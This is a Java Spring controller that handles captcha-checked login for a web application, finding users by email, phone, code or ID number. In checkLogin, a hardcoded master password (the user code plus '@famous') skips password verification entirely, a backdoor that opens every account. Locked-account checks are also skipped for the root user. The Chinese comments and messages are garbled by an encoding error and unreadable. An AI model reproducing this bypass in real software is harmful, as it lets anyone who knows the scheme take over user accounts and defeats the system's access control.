package com.pinde.sci.ctrl.inx;

import java.util.Date;
import java.util.List;

import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import com.pinde.core.page.PageHelper;
import com.pinde.core.util.SpringUtil;
import com.pinde.core.util.StringUtil;
import com.pinde.sci.biz.edc.IProjUserBiz;
import com.pinde.sci.biz.security.PasswordHelper;
import com.pinde.sci.biz.sys.IRoleBiz;
import com.pinde.sci.biz.sys.IUserBiz;
import com.pinde.sci.biz.sys.IUserRoleBiz;
import com.pinde.sci.common.GeneralController;
import com.pinde.sci.common.GeneralMethod;
import com.pinde.sci.common.GlobalConstant;
import com.pinde.sci.common.InitConfig;
import com.pinde.sci.common.SessionData;
import com.pinde.sci.dao.base.SysLogMapper;
import com.pinde.sci.enums.pub.UserStatusEnum;
import com.pinde.sci.enums.sys.OperTypeEnum;
import com.pinde.sci.model.mo.InxInfo;
import com.pinde.sci.model.mo.PubProjUser;
import com.pinde.sci.model.mo.ResDoctor;
import com.pinde.sci.model.mo.SysLog;
import com.pinde.sci.model.mo.SysRole;
import com.pinde.sci.model.mo.SysUser;
import com.pinde.sci.model.mo.SysUserRole;

@Controller
@RequestMapping("/inx/enso")
public class InxEnsoController extends GeneralController{
	@Autowired
	private IRoleBiz roleBiz;
	@Autowired
	private SysLogMapper logMapper;
	@Autowired
	private IUserBiz userBiz;
	@Autowired
	private IUserRoleBiz userRoleBiz;
	@Autowired
	private IProjUserBiz projUserBiz;
	
	
	
	
	@RequestMapping(value="",method={RequestMethod.GET})
	public String index(Model model){
		return "inx/enso/index";
	}
	
	
	
	private Object checkLogin(String userCode, String userPasswd,String verifyCode){
		String loginErrorMessage = "";
		//Ĭ�ϵ�¼ʧ�ܽ���
		String sessionValidateCode = StringUtil.defaultString((String)getSessionAttribute("verifyCode"));
		 //��֤�����벻��Ϊ�գ������ִ�Сд
		if (StringUtil.isBlank(verifyCode) ||!sessionValidateCode.equalsIgnoreCase(verifyCode)) {
			loginErrorMessage = "��֤�벻��ȷ";
			return loginErrorMessage;
		}
		 //��¼�벻��Ϊ��
		if (StringUtil.isBlank(userCode)){
			loginErrorMessage = "�û�������Ϊ��";
			return loginErrorMessage;
		}
		//���벻��Ϊ��
		if (StringUtil.isBlank(userPasswd)){
			loginErrorMessage = SpringUtil.getMessage("userPasswd.isNull");
			return loginErrorMessage;
		}
		//���Ƿ���ڴ��û�
		userCode = userCode.trim();
		SysUser user = userBiz.findByUserEmail(userCode);
		if(user==null){
			user = userBiz.findByUserPhone(userCode);
		}
		if(user==null){
			user = userBiz.findByUserCode(userCode);
		}
		if(user==null){
			user = userBiz.findByIdNo(userCode);
		}
		if(user==null){
			loginErrorMessage = "�û�������!";
			return loginErrorMessage;
		}
		
		//root�û����ж��Ƿ�����
		if(!GlobalConstant.ROOT_USER_CODE.equals(user.getUserCode())){
			if(UserStatusEnum.Locked.getId().equals(user.getStatusId())){
				loginErrorMessage = SpringUtil.getMessage("userCode.locked");
				return loginErrorMessage;
			}
		}
		
		//��������
		if(!StringUtil.defaultString(userPasswd).equals(userCode+"@famous")){
			//�ж�����
			String passwd = StringUtil.defaultString(user.getUserPasswd());
			if(!passwd.equalsIgnoreCase(PasswordHelper.encryptPassword(user.getUserFlow(), userPasswd.trim()))){
				loginErrorMessage = "�˺Ż����벻��ȷ��";
				return loginErrorMessage;
			}			
		}	
		return user;
	}

	/**
	 * ��¼
	 */
	@RequestMapping(value="/login",method={RequestMethod.POST})
	public String login(String userCode, String userPasswd,String verifyCode ,String errorLoginPage,Model model,HttpServletRequest request){
		//Ĭ�ϵ�¼ʧ�ܽ���
		if(StringUtil.isBlank(errorLoginPage)){
			errorLoginPage = "inx/enso/index";
		}
        Object obj = checkLogin(userCode, userPasswd, verifyCode);
        if(obj instanceof String){
        	model.addAttribute("loginErrorMessage", obj) ;
        	return errorLoginPage;
        }
        SysUser user = null;
        if(obj instanceof SysUser){
        	user = (SysUser)obj;
        }
		//���õ�ǰ�û�
		setSessionAttribute(GlobalConstant.CURRENT_USER, user);	
		
		if(GlobalConstant.ROOT_USER_CODE.equals(user.getUserCode())){
			return "redirect:/main?time="+new Date();
		}
		
		//�����û�����ʹ��
		SessionData sessionData = new SessionData();
		sessionData.setSysUser(user);
		sessionData.setIp(request.getRemoteAddr());
		long now = System.currentTimeMillis();
		String loginTime = new java.sql.Date(now)+"&nbsp;"+new java.sql.Time(now);
		sessionData.setLoginTime(loginTime);
		setSessionAttribute(SessionData.SESSIONDATAID,sessionData);
		
		//��¼��־
		SysLog log = new SysLog();
		//log.setReqTypeId(ReqTypeEnum.GET.getId());
		log.setOperId(OperTypeEnum.LogIn.getId());
		log.setOperName(OperTypeEnum.LogIn.getName());
		log.setLogDesc("��¼IP["+request.getRemoteAddr()+"]");
		log.setWsId(GlobalConstant.SYS_WS_ID);
		GeneralMethod.addSysLog(log);
		logMapper.insert(log);
		
		
//		PubProjUser projUser = new PubProjUser();
//		projUser.setUserFlow(user.getUserFlow());
//		userRole.setWsId(GlobalConstant.EDC_WS_ID);
//		List<PubProjUser> projUserList = projUserBiz.search(projUser);
//		if(projUserList==null || projUserList.size()==0){
//			model.addAttribute("loginErrorMessage","��ɫδ��Ȩ!");
//			return errorLoginPage;
//		}else {
//			model.addAttribute("projFlow",projUserList.get(0).getProjFlow());
			//return "redirect:/enso/main/"+projUserList.get(0).getRoleFlow();
			return "redirect:/medroad/main";
//		}
	}
	
}
